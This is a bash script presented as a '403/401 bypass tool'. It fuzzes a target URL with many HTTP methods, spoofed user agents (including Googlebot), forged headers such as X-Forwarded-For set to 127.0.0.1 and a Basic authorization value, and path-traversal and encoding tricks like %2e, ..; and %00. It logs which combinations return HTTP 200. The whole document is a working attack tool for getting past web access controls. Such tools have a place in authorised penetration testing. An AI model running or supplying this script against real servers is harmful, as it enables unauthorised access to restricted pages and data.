#!/bin/bash

# Enhanced 403/401 Bypass Tool
# Usage: bash tool.sh -u https://example.com -path /403/path

# Default parameters
url=""
path=""

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--url) url="$2"; shift ;;
        -path|--path) path="$2"; shift ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

# Ensure URL and path are provided
if [[ -z "$url" || -z "$path" ]]; then
    echo -e "\033[1;31mUsage: bash tool.sh -u https://example.com -path /403/path\033[0m"
    exit 1
fi

# Output log
output_file="bypass_results.txt"
echo "Bypassing 403/401 for $url$path" > "$output_file"
echo "Results will be saved to $output_file"
echo "====================================="

# Define lists for fuzzing
methods=("GET" "POST" "PUT" "DELETE" "HEAD" "OPTIONS" "TRACE" "CONNECT" "PATCH" "FOO" "SEARCH" "PROPFIND" "MKCOL" "COPY" "MOVE" "LOCK" "UNLOCK")
user_agents=(
    "Mozilla/5.0 (X11; Linux i686; rv:1.7.13) Gecko/20070322 Kazehakase/0.4.4.1"
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
    "curl/7.68.0"
    "Wget/1.20.3 (linux-gnu)"
    "python-requests/2.25.1"
)
headers=("X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Forwarded-Host: localhost" "Referer: /admin" "Forwarded: for=127.0.0.1" "Authorization: Basic Zm9vOmJhcg==" "Origin: https://example.com")
paths=("/%2e$path" "/%252e$path" "/../$path" "/..%00$path" "/~admin$path" "/$path/.." "/$path.." "/.$path" "/..;$path" "/%2e/$path")
protocols=("1.0" "1.1")

# Function to send requests
function send_request {
    method=$1
    ua=$2
    custom_header=$3
    target_path=$4
    protocol=$5

    response=$(curl -k -s -o /dev/null -w "%{http_code}" \
        -X "$method" \
        -A "$ua" \
        -H "$custom_header" \
        "$url$target_path" \
        --http"$protocol")
    
    if [[ "$response" == "200" ]]; then
        echo -e "\033[1;32m[200 OK] -> Method: $method, Path: $target_path, Protocol: HTTP/$protocol\033[0m"
        echo "[Method: $method, User-Agent: $ua, Header: $custom_header, Path: $target_path, Protocol: HTTP/$protocol] -> HTTP 200 OK" >> "$output_file"
    else
        echo -e "\033[1;31m[$response] -> Method: $method, Path: $target_path, Protocol: HTTP/$protocol\033[0m"
        echo "[Method: $method, User-Agent: $ua, Header: $custom_header, Path: $target_path, Protocol: HTTP/$protocol] -> HTTP $response" >> "$output_file"
    fi
}

# Start fuzzing
echo "Starting fuzzing..." >> "$output_file"
for method in "${methods[@]}"; do
    for ua in "${user_agents[@]}"; do
        for header in "${headers[@]}"; do
            for p in "${paths[@]}"; do
                for protocol in "${protocols[@]}"; do
                    send_request "$method" "$ua" "$header" "$p" "$protocol"
                done
            done
        done
    done
done

echo "Fuzzing complete. Check $output_file for results."
